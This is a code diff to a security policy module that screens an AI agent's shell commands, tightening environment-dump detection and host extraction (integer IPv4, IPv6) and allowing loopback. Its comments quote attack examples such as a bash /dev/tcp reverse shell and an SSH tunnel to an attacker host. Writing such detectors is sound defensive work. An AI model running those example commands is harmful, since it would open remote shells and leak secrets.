@@ -90,6 +90,12 @@ const PROTECTED_SECRETS = [
 // shell invocations and made this rule fire on ordinary scripted commands.
 const ENV_DUMP = /(^|[\s;&|("'`])(printenv|env)(\s|$)/;
 
+// A whole-environment dump to stdout: `printenv` or `env` as a complete command
+// segment, with no variable argument and no downstream filter. Matches a bare
+// dump or one at the end of a `;`/`&` sequence, but NOT a pipe (`printenv | grep`
+// is filtered) nor a var-setting `env FOO=bar cmd` nor `printenv NODE_ENV`.
+const FULL_ENV_DUMP = /(^|[\s;&("'`])(printenv|env)\s*($|[;&"'`])/;
+
 // Dotted tokens that are filenames, not hosts. Without this, scanning a command
 // for bare hosts would read `index.d.ts` as a domain.
 const FILE_EXTENSIONS = new Set([
@@ -101,29 +107,26 @@ const FILE_EXTENSIONS = new Set([
   // NB: do not add "example" here — it would mask attacker.example hosts.
 ]);
 
-// A bare dotted token is only a hostname if its last label is a plausible TLD.
-// Live traffic showed `process.platform` and `process.arch` being read as
-// domains, denying a harmless tool-availability check. URLs are unaffected:
-// anything with a scheme is extracted regardless of TLD, so an obscure TLD in a
-// real destination is still caught.
-const PLAUSIBLE_TLDS = new Set([
-  "com", "org", "net", "edu", "gov", "mil", "int", "io", "co", "ai", "dev",
-  "app", "cloud", "sh", "me", "tv", "cc", "ly", "to", "gg", "xyz", "top",
-  "info", "biz", "site", "online", "tech", "store", "live", "space", "click",
-  "link", "run", "page", "wiki", "blog", "news", "email", "chat", "social",
-  "shop", "team", "group", "media", "studio", "design", "software", "tools",
-  "network", "systems", "solutions", "services", "digital", "agency", "host",
-  "uk", "us", "cn", "jp", "de", "fr", "ru", "in", "id", "nl", "au", "ca", "br",
-  "es", "it", "se", "no", "fi", "dk", "pl", "ch", "at", "be", "kr", "sg", "hk",
-  "tw", "my", "th", "vn", "ph", "nz", "za", "mx", "ar", "cl", "ie", "pt", "gr",
-  // Reserved and demo names used by fixtures and internal hosts.
-  "example", "invalid", "test", "local", "internal", "localhost", "onion",
+// A bare dotted token is treated as a hostname unless it is a filename or a
+// code-identifier read (e.g. `process.platform`, `os.arch`). This catches any
+// real TLD — including uncommon ones like `.museum` — rather than an allowlist
+// that silently misses them. URLs are handled separately and unconditionally.
+const CODE_OBJECTS = new Set([
+  "process", "os", "path", "fs", "window", "document", "math", "json",
+  "console", "module", "exports", "require", "navigator", "location",
+  "globalthis", "self", "crypto", "util", "stream", "buffer", "events",
+  "child_process", "react", "vue",
 ]);
 
 function isPlausibleHost(token: string): boolean {
-  if (/^\d{1,3}(?:\.\d{1,3}){3}$/.test(token)) return true;
-  const tld = token.split(".").pop()?.toLowerCase() ?? "";
-  return PLAUSIBLE_TLDS.has(tld);
+  const lower = token.toLowerCase();
+  if (/^\d{1,3}(?:\.\d{1,3}){3}$/.test(lower)) return true; // dotted IPv4
+  if (/^\d{7,10}$/.test(lower)) return true; // decimal / integer-form IPv4
+  if (looksLikeFilename(lower)) return false;
+  const labels = lower.split(".");
+  if (labels.length >= 2 && CODE_OBJECTS.has(labels[0]!)) return false;
+  const tld = labels.at(-1) ?? "";
+  return /^[a-z]{2,24}$/.test(tld); // any alphabetic TLD, not a file extension
 }
 
 function looksLikeFilename(token: string): boolean {
@@ -148,6 +151,13 @@ function extractHosts(command: string): string[] {
     if (authority) hosts.add(authority.replace(/^.*@/, "").split(":")[0]!.toLowerCase());
   }
 
+  // IPv6 literals in brackets, e.g. `curl http://[2001:db8::1]/` or bare
+  // `nc [2001:db8::1] 80`. Without this an IPv6 destination is unreadable.
+  for (const match of command.matchAll(/\[([0-9a-f]{0,4}(?::[0-9a-f]{0,4}){2,})\]/gi)) {
+    const host = match[1];
+    if (host) hosts.add(host.toLowerCase());
+  }
+
   // Bash raw sockets, e.g. `bash -i >& /dev/tcp/198.51.100.7/9001 0>&1`. Without
   // this the host is unreadable and a reverse shell that names no secret and no
   // URL falls through every rule.
@@ -166,7 +176,7 @@ function extractHosts(command: string): string[] {
   // `ssh -R 9000:localhost:22 relay.attacker.example`, `openssl -connect h:443`.
   // Scanning only the token after the tool name missed every flagged variant.
   for (const match of withoutUrls.matchAll(
-    /(?:^|[\s;&|(=@:'"`])((?:[a-z0-9-]+\.)+[a-z]{2,}|\d{1,3}(?:\.\d{1,3}){3})(?=[\s;&|)'"`:,]|$)/gi,
+    /(?:^|[\s;&|(=@:'"`])((?:[a-z0-9-]+\.)+[a-z]{2,}|\d{1,3}(?:\.\d{1,3}){3}|\d{7,10})(?=[\s;&|)'"`:,]|$)/gi,
   )) {
     const token = match[1];
     if (!token || looksLikeFilename(token) || !isPlausibleHost(token)) continue;
@@ -228,6 +238,18 @@ export function evaluateCommand(
     return {
       rule: "protected-secret-access",
       detail: "Command reads " + secret + ".",
+    };
+  }
+
+  // A bare, unfiltered environment dump reveals ARK_API_KEY into the command
+  // output — which the model reads and may echo — even without egress. A
+  // filtered dump (`printenv | grep X`) or a var-setting `env FOO=bar cmd` or a
+  // single-var read (`printenv NODE_ENV`) is fine; only a whole-environment dump
+  // to stdout is denied.
+  if (FULL_ENV_DUMP.test(command)) {
+    return {
+      rule: "protected-secret-access",
+      detail: "Command dumps the full process environment, exposing secrets.",
     };
   }
 
@@ -324,13 +346,21 @@ export function scanCommands(
 }
 
 /** Ark's own host is always reachable; operators may allow more via config. */
+// Loopback is the container talking to itself (a local dev server the Agent
+// spun up to test), not an exfiltration channel — the host-side collector lives
+// on host.docker.internal, which is NOT loopback. Allowed by default and
+// consistently, so `curl localhost:3000` and `curl http://localhost/health`
+// behave the same. Obfuscated forms (decimal/IPv6 that happen to encode
+// loopback) are still denied — no legitimate task writes `curl 2130706433`.
+const LOOPBACK_HOSTS = ["localhost", "127.0.0.1", "::1"];
+
 export function policyContextFrom(
   arkBaseUrl: string,
   extraHosts: readonly string[] = [],
   secretValues: readonly string[] = [],
 ): PolicyContext {
   return {
-    allowedHosts: [...allowedHostsFrom(arkBaseUrl), ...extraHosts],
+    allowedHosts: [...allowedHostsFrom(arkBaseUrl), ...LOOPBACK_HOSTS, ...extraHosts],
     secretValues: [...secretValues],
   };
 }
